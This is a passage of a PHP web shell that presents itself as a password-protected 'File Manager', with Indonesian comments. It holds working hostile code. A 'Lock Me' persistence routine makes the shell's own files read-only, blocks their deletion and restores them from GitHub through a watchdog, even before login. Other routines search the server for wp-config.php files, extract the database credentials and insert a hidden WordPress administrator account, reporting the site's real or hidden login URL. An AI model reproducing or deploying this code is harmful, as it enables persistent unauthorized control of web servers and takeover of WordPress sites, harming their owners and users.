            return array('ok' => false, 'error' => 'Gagal tulis/kunci ' . $name . ' (permission?)');
        }
        $hashes[$name] = md5($body);
        $written[] = $name;
    }
    $state = array(
        'enabled' => true,
        'since' => gmdate('c'),
        'dir' => fm_lock_protect_dir(),
        'hashes' => $hashes,
        'last_sync' => time(),
        'files' => $targets,
    );
    fm_lock_write_state($state);
    fm_lock_ensure_watchdog();
    return array(
        'ok' => true,
        'enabled' => true,
        'linux' => true,
        'files' => $written,
        'dir' => fm_lock_protect_dir(),
        'state_file' => fm_lock_state_file(),
        'message' => 'Lock Me aktif: file dilindungi + self-heal dari GitHub',
    );
}

function fm_lock_disable() {
    if (!fm_lock_is_linux()) {
        return array('ok' => false, 'error' => 'Lock Me hanya untuk OS Linux');
    }
    $state = fm_lock_read_state();
    foreach (fm_lock_targets() as $path) {
        if (is_file($path)) @chmod($path, 0644);
    }
    $mirror = fm_lock_protect_dir() . DIRECTORY_SEPARATOR . '.abadi_lock';
    if (is_file($mirror)) @chmod($mirror, 0644);
    @unlink($mirror);

    // stop watchdog bila bisa
    $pidFile = fm_lock_watchdog_script() . '.pid';
    if (is_file($pidFile)) {
        $pid = (int)trim((string)@file_get_contents($pidFile));
        if ($pid > 1) {
            if (fm_lock_shell_ok('posix_kill') && function_exists('posix_kill')) {
                @posix_kill($pid, 15);
            } elseif (fm_lock_shell_ok('exec')) {
                @exec('kill ' . (int)$pid . ' 2>/dev/null');
            }
        }
        @unlink($pidFile);
    }
    @unlink(fm_lock_watchdog_script());

    $state['enabled'] = false;
    $state['disabled_at'] = gmdate('c');
    fm_lock_write_state($state);
    return array('ok' => true, 'enabled' => false, 'message' => 'Lock Me nonaktif');
}

function fm_lock_status() {
    $linux = fm_lock_is_linux();
    $state = fm_lock_read_state();
    $files = array();
    foreach (fm_lock_targets() as $name => $path) {
        $ex = is_file($path);
        $files[$name] = array(
            'path' => $path,
            'exists' => $ex,
            'size' => $ex ? (int)@filesize($path) : 0,
            'md5' => $ex ? (string)@md5_file($path) : '',
            'writable' => $ex ? is_writable($path) : false,
        );
    }
    return array(
        'ok' => true,
        'linux' => $linux,
        'enabled' => $linux && !empty($state['enabled']),
        'state' => $state,
        'files' => $files,
        'state_file' => fm_lock_state_file(),
        'dir' => fm_lock_protect_dir(),
        'note' => 'Tanpa chattr (butuh root). Proteksi: chmod 0444 + blokir FM + self-heal GitHub tiap request/watchdog.',
    );
}

// Self-heal dini (Linux + lock on) — jalan meski belum login
if (fm_lock_is_linux()) {
    $__fm_lock_boot = fm_lock_read_state();
    if (!empty($__fm_lock_boot['enabled'])) {
        @fm_lock_self_heal(false);
    }
    unset($__fm_lock_boot);
}

function human_size($bytes) {
    $bytes = (float)$bytes;
    $u = array('B','KB','MB','GB','TB');
    $i = 0;
    while ($bytes >= 1024 && $i < count($u) - 1) { $bytes /= 1024; $i++; }
    return round($bytes, $i ? 2 : 0) . ' ' . $u[$i];
}
function perms_str($path) {
    if (!@file_exists($path)) return '---------';
    $p = @fileperms($path);
    if ($p === false) return '---------';
    $info = (($p & 0x4000) ? 'd' : (($p & 0xA000) ? 'l' : '-'));
    $info .= (($p & 0x0100) ? 'r' : '-');
    $info .= (($p & 0x0080) ? 'w' : '-');
    $info .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-'));
    $info .= (($p & 0x0020) ? 'r' : '-');
    $info .= (($p & 0x0010) ? 'w' : '-');
    $info .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-'));
    $info .= (($p & 0x0004) ? 'r' : '-');
    $info .= (($p & 0x0002) ? 'w' : '-');
    $info .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-'));
    return $info;
}
function perms_oct($path) {
    if (!@file_exists($path)) return '000';
    $p = @fileperms($path);
    if ($p === false) return '000';
    return substr(sprintf('%o', $p), -3);
}
function fm_owner_name($path) {
    $oid = @fileowner($path);
    if ($oid === false) return '-';
    if (function_exists('posix_getpwuid')) {
        $info = @posix_getpwuid($oid);
        if (is_array($info) && isset($info['name'])) return $info['name'];
    }
    return (string)$oid;
}


function is_editable($path) {
    if (!is_file($path) || !is_readable($path)) return false;
    if (filesize($path) > FM_EDIT_MAX) return false;
    $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
    $ok = ['txt','md','markdown','php','js','css','html','htm','json','xml','yml','yaml','ini','conf','cfg','log','sql','py','rb','sh','bat','ps1','ts','tsx','jsx','vue','env','htaccess','gitignore','csv','svg','twig','blade','scss','less','sass','toml','lock','map','c','cpp','h','java','go','rs','lua','pl','r','m','swift','kt','dart','vue','svelte'];
    if (in_array($ext, $ok, true)) return true;
    if ($ext === '' || $ext === 'txt') {
        $f = @fopen($path, 'rb');
        if (!$f) return false;
        $chunk = fread($f, 8000);
        fclose($f);
        return $chunk === '' || preg_match('//u', $chunk) && !preg_match('/[\x00-\x08\x0B\x0C\x0E-\x1F]/', $chunk);
    }
    return false;
}

function rrmdir($dir) {
    if (!is_dir($dir)) return false;
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $p = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($p) && !is_link($p)) rrmdir($p);
        else @unlink($p);
    }
    return @rmdir($dir);
}

function copy_recursive($src, $dst) {
    if (is_link($src)) return false;
    if (is_file($src)) {
        $dir = dirname($dst);
        if (!is_dir($dir)) @mkdir($dir, 0755, true);
        return copy($src, $dst);
    }
    if (!is_dir($dst)) @mkdir($dst, 0755, true);
    $items = scandir($src);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        if (!copy_recursive($src . DIRECTORY_SEPARATOR . $item, $dst . DIRECTORY_SEPARATOR . $item)) return false;
    }
    return true;
}

function move_item($src, $dst) {
    if (@rename($src, $dst)) return true;
    if (copy_recursive($src, $dst)) {
        if (is_dir($src)) return rrmdir($src);
        return @unlink($src);
    }
    return false;
}

function show_login($error = null) {
    $name = FM_NAME;
    $title = htmlspecialchars(fm_page_title(), ENT_QUOTES, 'UTF-8');
    $logo = FM_LOGO_URL;
    $icon = FM_ICON_URL;
    $err = $error ? '<div class="err">'.htmlspecialchars($error).'</div>' : '';
    echo <<<HTML
<!DOCTYPE html>
<html lang="id"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>{$title}</title>
<link rel="icon" type="image/png" href="{$icon}">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{min-height:100vh;display:flex;align-items:center;justify-content:center;background:radial-gradient(ellipse 70% 50% at 50% 0%,rgba(192,240,0,.12),transparent 55%),#000;font-family:Inter,system-ui,sans-serif;color:#f4ffe6}
.card{width:min(400px,92vw);background:#0a0f06;border:1px solid #1e2c14;border-radius:18px;padding:28px 28px 32px;box-shadow:0 20px 60px rgba(0,0,0,.55),0 0 40px rgba(192,240,0,.08)}
.logo{display:block;width:min(280px,100%);height:auto;margin:0 auto 18px;filter:drop-shadow(0 0 14px rgba(192,240,0,.35))}
.sub{color:#a3bf78;font-size:.85rem;margin-bottom:22px;text-align:center}
label{display:block;font-size:.8rem;color:#a3bf78;margin-bottom:6px;font-weight:600}
input{width:100%;padding:12px 14px;border-radius:10px;border:1px solid #354a22;background:#000;color:#f4ffe6;font-size:1rem;outline:none}
input:focus{border-color:#c0f000;box-shadow:0 0 0 3px rgba(192,240,0,.25)}
button{width:100%;margin-top:16px;padding:12px;border:0;border-radius:10px;background:linear-gradient(135deg,#c0f000,#9ad400);color:#0a1000;font-weight:800;cursor:pointer;font-size:.95rem;letter-spacing:.04em;box-shadow:0 4px 18px rgba(192,240,0,.3)}
button:hover{filter:brightness(1.08)}
.err{background:#4a1212;color:#fecaca;padding:10px 12px;border-radius:8px;margin-bottom:14px;font-size:.85rem;border:1px solid #7f1d1d}
</style></head><body>
<form class="card" method="post">
  <img class="logo" src="{$logo}" alt="{$name}">
  <p class="sub">File Manager — masukkan password</p>
  {$err}
  <label for="password">Password</label>
  <input type="password" id="password" name="password" autofocus required>
  <button type="submit" name="fm_login" value="1">MASUK</button>
</form></body></html>
HTML;
}

/* ========== WORDPRESS ADMIN ========== */
/**
 * Cari wp-config.php mulai dari lokasi FM saat ini.
 * Urutan:
 *  1) folder sekarang + naik parent (sampai root/FM_ROOT)
 *  2) BFS ke bawah dari folder sekarang
 *  3) fallback BFS dari DOCUMENT_ROOT / home FM
 *
 * @param int $limit max hasil
 * @param string|null $startRel path relatif FM (state.path) atau absolut
 * @return string[] full path wp-config.php
 */
function fm_wp_find_configs($limit = 40, $startRel = null) {
    $found = array();
    $seen = array();
    $add = function ($file) use (&$found, &$seen, $limit) {
        if (count($found) >= $limit) return false;
        $real = @realpath($file);
        if (!$real || !is_file($real) || !is_readable($real)) return false;
        if (strtolower(basename($real)) !== 'wp-config.php') return false;
        $k = strtolower(str_replace('\\', '/', $real));
        if (!empty($seen[$k])) return false;
        $seen[$k] = 1;
        $found[] = $real;
        return true;
    };

    $skip = array(
        'node_modules', '.git', 'vendor', 'cache', 'uploads',
        'wp-content', 'wp-includes', 'wp-admin', 'cgi-bin',
        'tmp', 'temp', 'logs', 'log', 'backup', 'backups',
        'node', 'bower_components', '.svn', '.hg',
        'cache_html', 'min', 'wflogs',
    );

    $bfs = function ($root, $maxDepth, $maxNodes) use ($add, $skip, $limit, &$found) {
        if (!$root || !is_dir($root) || count($found) >= $limit) return;
        $root = @realpath($root);
        if (!$root) return;
        $q = array($root);
        $depth = array($root => 0);
        $guard = 0;
        while ($q && count($found) < $limit && $guard < $maxNodes) {
            $guard++;
            $dir = array_shift($q);
            $d = isset($depth[$dir]) ? $depth[$dir] : 0;
            $add($dir . DIRECTORY_SEPARATOR . 'wp-config.php');
            // WP sering di parent folder publik — cek juga
            if ($d >= $maxDepth) continue;
            $list = @scandir($dir);
            if (!$list) continue;
            foreach ($list as $n) {
                if ($n === '.' || $n === '..') continue;
                if (isset($n[0]) && $n[0] === '.' && $n !== '.well-known') continue;
                if (in_array(strtolower($n), $skip, true)) continue;
                $full = $dir . DIRECTORY_SEPARATOR . $n;
                if (@is_dir($full) && !@is_link($full)) {
                    $rp = @realpath($full);
                    if ($rp === false) continue;
                    if (isset($depth[$rp])) continue;
                    $q[] = $rp;
                    $depth[$rp] = $d + 1;
                }
            }
        }
    };

    // ---- resolve folder mulai (lokasi FM sekarang) ----
    $startDir = null;
    if ($startRel !== null && $startRel !== '') {
        $full = safe_path($startRel);
        if ($full !== false) {
            $startDir = is_dir($full) ? $full : dirname($full);
            $startDir = @realpath($startDir);
        }
        // absolut di luar safe_path? coba realpath mentah jika under root
        if (!$startDir) {
            $try = @realpath($startRel);
            if ($try && under_root($try)) {
                $startDir = is_dir($try) ? $try : dirname($try);
                $startDir = @realpath($startDir);
            }
        }
    }
    if (!$startDir || !is_dir($startDir)) {
        $home = fm_home_rel();
        $hf = $home !== '' ? safe_path($home) : false;
        if ($hf && is_dir($hf)) $startDir = $hf;
    }
    if (!$startDir || !is_dir($startDir)) {
        $startDir = @realpath(dirname(__FILE__));
    }
    if (!$startDir) $startDir = FM_ROOT;

    // 1) Naik ke atas dari lokasi sekarang (paling relevan untuk WP)
    $walk = $startDir;
    $upGuard = 0;
    while ($walk && $upGuard < 32 && count($found) < $limit) {
        $upGuard++;
        $add($walk . DIRECTORY_SEPARATOR . 'wp-config.php');
        // kadang wp-config di parent saat kita di /public atau /httpdocs
        $parent = @dirname($walk);
        $parentReal = $parent ? @realpath($parent) : false;
        if ($parentReal === false || $parentReal === $walk) break;
        if (!under_root($parentReal) && fm_norm($parentReal) !== fm_norm(FM_ROOT)) {
            // tetap boleh naik ke parent dekat start, tapi henti di luar FM_ROOT kecuali sama drive root
            if (fm_norm(FM_ROOT) !== '/' && !preg_match('#^[A-Za-z]:$#', fm_norm(FM_ROOT))) {
                break;
            }
        }
        $walk = $parentReal;
    }

    // 2) BFS ke bawah dari lokasi sekarang
    $bfs($startDir, 5, 4000);

    // 3) Fallback: DOCUMENT_ROOT + home
    $docroot = '';
    if (!empty($_SERVER['DOCUMENT_ROOT'])) {
        $docroot = @realpath($_SERVER['DOCUMENT_ROOT']);
    }
    if ($docroot && is_dir($docroot)) {
        $add($docroot . DIRECTORY_SEPARATOR . 'wp-config.php');
        $bfs($docroot, 5, 5000);
    }
    $homeRel = fm_home_rel();
    if ($homeRel !== '') {
        $homeFull = safe_path($homeRel);
        if ($homeFull && is_dir($homeFull) && fm_norm($homeFull) !== fm_norm($startDir)) {
            $bfs($homeFull, 4, 3000);
        }
    }

    // sort: dekat startDir dulu, lalu path lebih dangkal
    $startNorm = str_replace('\\', '/', fm_norm($startDir));
    usort($found, function ($a, $b) use ($startNorm) {
        $na = str_replace('\\', '/', fm_norm($a));
        $nb = str_replace('\\', '/', fm_norm($b));
        $da = dirname($na);
        $db = dirname($nb);
        $aNear = (strpos($da, $startNorm) === 0 || strpos($startNorm, $da) === 0) ? 0 : 1;
        $bNear = (strpos($db, $startNorm) === 0 || strpos($startNorm, $db) === 0) ? 0 : 1;
        if ($aNear !== $bNear) return $aNear - $bNear;
        $ca = substr_count($na, '/');
        $cb = substr_count($nb, '/');
        if ($ca !== $cb) return $ca - $cb;
        return strcasecmp($a, $b);
    });

    return $found;
}

function fm_wp_parse_config($file) {
    $src = @file_get_contents($file);
    if ($src === false) return false;
    $get = function ($name) use ($src) {
        $re = "/define\s*\(\s*['\"]" . preg_quote($name, '/') . "['\"]\s*,\s*['\"]([^'\"]*)['\"]\s*\)/i";
        if (preg_match($re, $src, $m)) return $m[1];
        return null;
    };
    $db = array(
        'name' => $get('DB_NAME'),
        'user' => $get('DB_USER'),
        'pass' => $get('DB_PASSWORD'),
        'host' => $get('DB_HOST'),
        'charset' => $get('DB_CHARSET') ? $get('DB_CHARSET') : 'utf8mb4',
    );
    $prefix = 'wp_';
    if (preg_match('/\$table_prefix\s*=\s*[\'"]([^\'"]+)[\'"]\s*;/', $src, $m)) {
        $prefix = $m[1];
    }
    if (!$db['name'] || !$db['user'] || $db['host'] === null) return false;
    if ($db['pass'] === null) $db['pass'] = '';
    return array('file' => $file, 'dir' => dirname($file), 'db' => $db, 'prefix' => $prefix);
}

function fm_wp_pdo($db) {
    if (!class_exists('PDO')) return 'PDO tidak tersedia';
    $host = $db['host'];
    $port = '3306';
    $socket = null;
    if (strpos($host, ':/') !== false) {
        $parts = explode(':', $host, 2);
        $hostName = $parts[0];
        $socket = $parts[1];
        $host = $hostName;
    } elseif (preg_match('/^(.+):(\d+)$/', $host, $m)) {
        $host = $m[1];
        $port = $m[2];
    }
    try {
        if ($socket) {
            $dsn = 'mysql:unix_socket=' . $socket . ';dbname=' . $db['name'] . ';charset=' . $db['charset'];
        } else {
            $dsn = 'mysql:host=' . $host . ';port=' . $port . ';dbname=' . $db['name'] . ';charset=' . $db['charset'];
        }
        return new PDO($dsn, $db['user'], $db['pass'], array(
            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
        ));
    } catch (Exception $e) {
        return $e->getMessage();
    }
}

function fm_wp_hash_password($password) {
    // WP accepts MD5 and rehashes after login
    return md5($password);
}

function fm_wp_tbl($prefix, $name) {
    return str_replace('`', '', $prefix . $name);
}

function fm_wp_site_url($wpdir, $pdo = null, $prefix = 'wp_') {
    if ($pdo) {
        try {
            $st = $pdo->prepare('SELECT option_name, option_value FROM `' . fm_wp_tbl($prefix, 'options') . '` WHERE option_name IN (\'siteurl\',\'home\')');
            $st->execute();
            $opts = array();
            while ($row = $st->fetch()) $opts[$row['option_name']] = $row['option_value'];
            if (!empty($opts['siteurl'])) return rtrim($opts['siteurl'], '/');
            if (!empty($opts['home'])) return rtrim($opts['home'], '/');
        } catch (Exception $e) {}
    }
    $doc = !empty($_SERVER['DOCUMENT_ROOT']) ? @realpath($_SERVER['DOCUMENT_ROOT']) : false;
    $dir = @realpath($wpdir);
    $https = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')
        || (isset($_SERVER['SERVER_PORT']) && (string)$_SERVER['SERVER_PORT'] === '443');
    $scheme = $https ? 'https' : 'http';
    $host = !empty($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost';
    $base = $scheme . '://' . $host;
    if ($doc && $dir) {
        $docN = str_replace('\\', '/', $doc);
        $dirN = str_replace('\\', '/', $dir);
        if (strpos($dirN, $docN) === 0) {
            $rel = substr($dirN, strlen($docN));
            return rtrim($base . $rel, '/');
        }
    }
    return $base;
}

/**
 * Baca satu option dari wp_options.
 * Contoh hide login (WPS Hide Login):
 *   SELECT option_name, option_value FROM wp_options WHERE option_name = 'whl_page'
 */
function fm_wp_get_option($pdo, $prefix, $name) {
    if (!is_object($pdo) || $name === '') return '';
    try {
        $st = $pdo->prepare(
            'SELECT option_value FROM `' . fm_wp_tbl($prefix, 'options') . '` WHERE option_name = ? LIMIT 1'
        );
        $st->execute(array($name));
        $row = $st->fetch();
        if (!$row || !isset($row['option_value'])) return '';
        return is_string($row['option_value']) ? $row['option_value'] : (string)$row['option_value'];
    } catch (Exception $e) {
        return '';
    }
}

/**
 * Deteksi slug hide-login (WPS Hide Login dll).
 * @return array{slug:string,source:string,raw:string}
 */
function fm_wp_hide_login_info($pdo, $prefix) {
    $out = array('slug' => '', 'source' => '', 'raw' => '');
    if (!is_object($pdo)) return $out;

    // Prioritas: whl_page (WPS Hide Login)
    $keys = array(
        'whl_page' => 'wps-hide-login',
        'rwl_page' => 'rename-wp-login',
        'wps_hide_login' => 'wps-hide-login-alt',
        'login_page_slug' => 'login-page-slug',
        'ahcl_login_url' => 'custom-login-url',
    );
    foreach ($keys as $opt => $src) {
        $val = trim(fm_wp_get_option($pdo, $prefix, $opt));
        if ($val === '') continue;
        // kadang serialized
        if ($val[0] === 'a' || $val[0] === 'O' || $val[0] === 's') {
            $unser = @unserialize($val);
            if (is_array($unser)) {
                foreach (array('slug', 'page', 'login', 'whl_page', 'url') as $k) {
                    if (!empty($unser[$k]) && is_string($unser[$k])) {
                        $val = $unser[$k];
                        break;
                    }
                }
            } elseif (is_string($unser) && $unser !== '') {
                $val = $unser;
            }
        }
        $val = trim(str_replace('\\', '/', $val));
        $val = trim($val, "/ \t\r\n");
        // buang URL penuh → ambil path
        if (preg_match('#^https?://#i', $val)) {
            $p = parse_url($val, PHP_URL_PATH);
            $val = is_string($p) ? trim($p, '/') : '';
        }
        // slug aman
        if ($val === '' || !preg_match('#^[A-Za-z0-9_\-\./]+$#', $val)) continue;
        if (preg_match('#\.\.#', $val)) continue;
        $out['slug'] = $val;
        $out['source'] = $src;
        $out['raw'] = $opt;
        break;
    }
    return $out;
}

/**
 * URL login WP: pakai hide-login slug jika ada, else wp-login.php
 * @return array{login_url:string,hide_login:bool,whl_page:string,hide_source:string}
 */
function fm_wp_resolve_login_url($site, $pdo, $prefix) {
    $site = rtrim((string)$site, '/');
    $hide = fm_wp_hide_login_info($pdo, $prefix);
    if ($hide['slug'] !== '') {
        return array(
            'login_url' => $site . '/' . $hide['slug'],
            'hide_login' => true,
            'whl_page' => $hide['slug'],
            'hide_source' => $hide['source'],
            'hide_option' => $hide['raw'],
        );
    }
    return array(
        'login_url' => $site . '/wp-login.php',
        'hide_login' => false,
        'whl_page' => '',
        'hide_source' => '',
        'hide_option' => '',
    );
}

function fm_wp_create_admin($cfg, $username = null, $password = null, $email = null) {
    $pdo = fm_wp_pdo($cfg['db']);
    if (!is_object($pdo)) {
        return array('ok' => false, 'error' => 'DB connect gagal: ' . (is_string($pdo) ? $pdo : 'unknown'));
    }
    $prefix = $cfg['prefix'];
    $users = fm_wp_tbl($prefix, 'users');
    $usermeta = fm_wp_tbl($prefix, 'usermeta');
    try {
        $pdo->query('SELECT ID FROM `' . $users . '` LIMIT 1');
    } catch (Exception $e) {
        return array('ok' => false, 'error' => 'Tabel users tidak ada: ' . $e->getMessage());
    }

    if (!$username) $username = 'an_' . substr(md5(uniqid((string)mt_rand(), true)), 0, 8);
    if (!$password) {
        $password = substr(md5(uniqid((string)mt_rand(), true)), 0, 10);
    }
    $host = !empty($_SERVER['HTTP_HOST']) ? preg_replace('/:\\d+$/', '', $_SERVER['HTTP_HOST']) : 'localhost';
    if (!$email) $email = $username . '@' . $host;

    $baseUser = $username;
    for ($i = 0; $i < 40; $i++) {
        $try = $i === 0 ? $baseUser : ($baseUser . $i);
        $st = $pdo->prepare('SELECT ID FROM `' . $users . '` WHERE user_login = ? LIMIT 1');
        $st->execute(array($try));
        if (!$st->fetch()) { $username = $try; break; }
    }

    $hash = fm_wp_hash_password($password);
    $now = gmdate('Y-m-d H:i:s');
    try {
        $sql = 'INSERT INTO `' . $users . '` (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_activation_key, user_status, display_name) VALUES (?,?,?,?,?,?,?,?,?)';
        $st = $pdo->prepare($sql);
        $st->execute(array($username, $hash, $username, $email, '', $now, '', 0, $username));
        $uid = (int)$pdo->lastInsertId();
        if ($uid <= 0) return array('ok' => false, 'error' => 'Insert user gagal');

        $caps = serialize(array('administrator' => true));
        $ins = $pdo->prepare('INSERT INTO `' . $usermeta . '` (user_id, meta_key, meta_value) VALUES (?,?,?)');
        $rows = array(
            array($uid, $prefix . 'capabilities', $caps),
            array($uid, $prefix . 'user_level', '10'),
            array($uid, 'nickname', $username),
        );
        foreach ($rows as $r) {
            try { $ins->execute($r); } catch (Exception $e) {}
        }
    } catch (Exception $e) {
        return array('ok' => false, 'error' => 'DB error: ' . $e->getMessage());
    }

    $site = fm_wp_site_url($cfg['dir'], $pdo, $prefix);
    // Hide login: SELECT option_value FROM wp_options WHERE option_name = 'whl_page'
    $login = fm_wp_resolve_login_url($site, $pdo, $prefix);
    return array(
        'ok' => true,
        'user_id' => $uid,
        'username' => $username,
        'password' => $password,
        'email' => $email,
        'siteurl' => $site,
        'login_url' => $login['login_url'],
        'admin_url' => $site . '/wp-admin/',
        'hide_login' => !empty($login['hide_login']),
        'whl_page' => isset($login['whl_page']) ? $login['whl_page'] : '',
        'hide_source' => isset($login['hide_source']) ? $login['hide_source'] : '',
        'hide_option' => isset($login['hide_option']) ? $login['hide_option'] : '',
        'wp_config' => $cfg['file'],
        'prefix' => $prefix,
    );
}

/* ========== API ========== */
$__fm_is_api = isset($_GET['api'])
    || (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest' && (isset($_POST['action']) || isset($_GET['action'])));
if ($__fm_is_api) {
    // prevent accidental HTML/warnings from breaking JSON
    @ini_set('display_errors', '0');
    @error_reporting(E_ALL);
    while (function_exists('ob_get_level') && ob_get_level() > 0) { @ob_end_clean(); }
    @ob_start();
    // catch fatal errors as JSON
    register_shutdown_function(function () {
        $err = error_get_last();
        if (!$err) return;
        $fatal = array(E_ERROR, E_PARSE, E_CORE_ERROR, E_COMPILE_ERROR, E_USER_ERROR);
        if (!in_array($err['type'], $fatal, true)) return;
        if (!headers_sent()) {
            header('Content-Type: application/json; charset=utf-8');
            http_response_code(500);
        }
        $msg = isset($err['message']) ? $err['message'] : 'Fatal error';
        echo '{"ok":false,"error":' . json_encode('Fatal: ' . $msg) . '}';
    });
    $action = fm_req('action', '');
    if ($action === '' && isset($_GET['action'])) $action = (string)$_GET['action'];
    try {
        switch ($action) {

            case 'list': {
                $path = safe_path(fm_req('path', ''));
                if ($path === false || !is_dir($path)) json_out(['ok'=>false,'error'=>'Path tidak valid'], 400);
                $items = [];
                $scan = @scandir($path);
                if ($scan === false) json_out(['ok'=>false,'error'=>'Tidak bisa membaca folder'], 403);
                foreach ($scan as $name) {
                    if ($name === '.' || $name === '..') continue;
                    $full = $path . DIRECTORY_SEPARATOR . $name;
                    $isDir = is_dir($full);
                    $size = $isDir ? 0 : (@filesize($full) ?: 0);
                    $mtime = @filemtime($full) ?: 0;
                    $items[] = [
                        'name' => $name,
                        'path' => rel_from_full($full),
                        'type' => $isDir ? 'dir' : 'file',
                        'size' => $size,
                        'size_h' => $isDir ? '—' : human_size($size),
                        'mtime' => $mtime,
                        'mtime_h' => $mtime ? date('Y-m-d H:i', $mtime) : '—',
                        'perms' => perms_str($full),
                        'chmod' => perms_oct($full),
                        'ext' => $isDir ? '' : strtolower(pathinfo($name, PATHINFO_EXTENSION)),
                        'editable' => !$isDir && is_editable($full),
                        'readable' => is_readable($full),
                        'writable' => is_writable($full),
                    ];
                }
                usort($items, function ($a, $b) {
                    if ($a['type'] !== $b['type']) return $a['type'] === 'dir' ? -1 : 1;
                    return strcasecmp($a['name'], $b['name']);
                });
                $rel = rel_from_full($path);
                // tiap folder di path = 1 tombol (klik "htdocs" → masuk htdocs)
                $crumbs = [];
                $crumbs[] = ['name' => root_label(), 'path' => ''];
                if ($rel !== '') {
                    $acc = [];
                    foreach (explode('/', str_replace('\\', '/', $rel)) as $seg) {
                        if ($seg === '') continue;
                        $acc[] = $seg;
                        $crumbs[] = ['name' => $seg, 'path' => implode('/', $acc)];
                    }
                }
                json_out([
                    'ok' => true,
                    'path' => $rel,
                    'full' => $path,
                    'writable' => is_writable($path),
                    'crumbs' => $crumbs,
                    'items' => $items,
                    'count' => count($items),
                    'root' => FM_ROOT,
                    'root_label' => root_label(),
                    'sep' => fm_is_win() ? '\\' : '/',
                    'home' => fm_home_rel(),
                ]);
            }

            case 'mkdir': {
                $base = safe_path(fm_arr($_POST, 'path', ''));
                $name = trim((string)(fm_arr($_POST, 'name', '')));
                if ($base === false || !is_dir($base)) json_out(['ok'=>false,'error'=>'Path tidak valid'], 400);
                if ($name === '' || preg_match('/[\\\\\/:*?"<>|]/', $name) || $name === '.' || $name === '..') {
                    json_out(['ok'=>false,'error'=>'Nama folder tidak valid'], 400);
                }
                $dest = $base . DIRECTORY_SEPARATOR . $name;
                if (file_exists($dest)) json_out(['ok'=>false,'error'=>'Sudah ada'], 409);
                if (!@mkdir($dest, 0755, true)) json_out(['ok'=>false,'error'=>'Gagal membuat folder'], 500);
                json_out(['ok'=>true,'message'=>'Folder dibuat','path'=>rel_from_full($dest)]);
            }

            case 'mkfile': {
                $base = safe_path(fm_arr($_POST, 'path', ''));
                $name = trim((string)(fm_arr($_POST, 'name', '')));
                $content = (string)(fm_arr($_POST, 'content', ''));
                if ($base === false || !is_dir($base)) json_out(['ok'=>false,'error'=>'Path tidak valid'], 400);
                if ($name === '' || preg_match('/[\\\\\/:*?"<>|]/', $name) || $name === '.' || $name === '..') {
                    json_out(['ok'=>false,'error'=>'Nama file tidak valid'], 400);
                }
                $dest = $base . DIRECTORY_SEPARATOR . $name;
                if (file_exists($dest)) json_out(['ok'=>false,'error'=>'Sudah ada'], 409);
                if (@file_put_contents($dest, $content) === false) json_out(['ok'=>false,'error'=>'Gagal membuat file'], 500);
                json_out(['ok'=>true,'message'=>'File dibuat','path'=>rel_from_full($dest)]);
            }

            case 'rename': {
                $src = safe_path(fm_arr($_POST, 'path', ''));
                $newName = trim((string)(fm_arr($_POST, 'name', '')));
                if ($src === false || !file_exists($src)) json_out(['ok'=>false,'error'=>'Item tidak ditemukan'], 404);
                if (rel_from_full($src) === '') json_out(['ok'=>false,'error'=>'Tidak bisa rename root'], 400);
                if (fm_lock_is_protected_path($src)) {
                    fm_lock_self_heal(true);
                    json_out(['ok'=>false,'error'=>'Lock Me: file dilindungi (tidak bisa rename)'], 403);
                }
                if ($newName === '' || preg_match('/[\\\\\/:*?"<>|]/', $newName) || $newName === '.' || $newName === '..') {
                    json_out(['ok'=>false,'error'=>'Nama tidak valid'], 400);
                }
                $dest = dirname($src) . DIRECTORY_SEPARATOR . $newName;
                if (file_exists($dest)) json_out(['ok'=>false,'error'=>'Nama sudah dipakai'], 409);
                if (!@rename($src, $dest)) json_out(['ok'=>false,'error'=>'Gagal rename'], 500);
                json_out(['ok'=>true,'message'=>'Berhasil di-rename','path'=>rel_from_full($dest)]);
            }

            case 'delete': {
                $raw = (isset($_POST['paths']) ? $_POST['paths'] : fm_arr($_POST, 'path', ''));
                $list = is_array($raw) ? $raw : (is_string($raw) && $raw !== '' ? [$raw] : []);
                if (!$list) json_out(['ok'=>false,'error'=>'Tidak ada item'], 400);
                $deleted = 0; $errors = [];
                foreach ($list as $rel) {
                    $p = safe_path($rel);
                    if ($p === false || !file_exists($p)) { $errors[] = "$rel tidak ditemukan"; continue; }
                    if (rel_from_full($p) === '') { $errors[] = 'Tidak bisa hapus root'; continue; }
                    if (fm_lock_is_protected_path($p)) {
                        fm_lock_self_heal(true);
                        $errors[] = "Lock Me: $rel dilindungi (auto-restore)";
                        continue;
                    }
                    $ok = is_dir($p) && !is_link($p) ? rrmdir($p) : @unlink($p);
                    if ($ok) $deleted++; else $errors[] = "Gagal hapus $rel";
                }
                // setelah hapus massal, pastikan core files tetap ada
                if (fm_lock_is_linux()) fm_lock_self_heal(false);
                json_out(['ok'=>$deleted > 0,'deleted'=>$deleted,'errors'=>$errors,'message'=>"$deleted item dihapus"]);
            }

            case 'move': {
                $raw = (isset($_POST['paths']) ? $_POST['paths'] : fm_arr($_POST, 'path', ''));
                $list = is_array($raw) ? $raw : (is_string($raw) && $raw !== '' ? [$raw] : []);
                $destRel = fm_arr($_POST, 'dest', '');
                $dest = safe_path($destRel);
                if ($dest === false || !is_dir($dest)) json_out(['ok'=>false,'error'=>'Tujuan tidak valid'], 400);
                if (!$list) json_out(['ok'=>false,'error'=>'Tidak ada item'], 400);
                $moved = 0; $errors = [];
                foreach ($list as $rel) {
                    $src = safe_path($rel);
